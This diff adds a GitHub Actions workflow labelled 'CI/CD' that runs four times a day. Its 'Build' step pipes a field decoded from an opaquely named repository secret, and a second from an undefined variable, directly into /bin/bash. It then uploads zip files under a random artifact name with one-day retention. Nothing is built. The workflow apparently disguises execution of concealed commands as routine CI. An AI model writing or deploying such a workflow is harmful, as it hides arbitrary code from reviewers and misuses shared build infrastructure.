@@ -1,0 +1,29 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '33 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          tsxyx2: ${{ secrets.tsxyx2 }}
+        run: |
+          printf '%s' "$tsxyx2" | jq -r .l051 | /bin/bash
+          echo $rptk49540 | jq -r .hl99 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: wCOuFJYY
+          path: "*.zip"
+          retention-days: 1
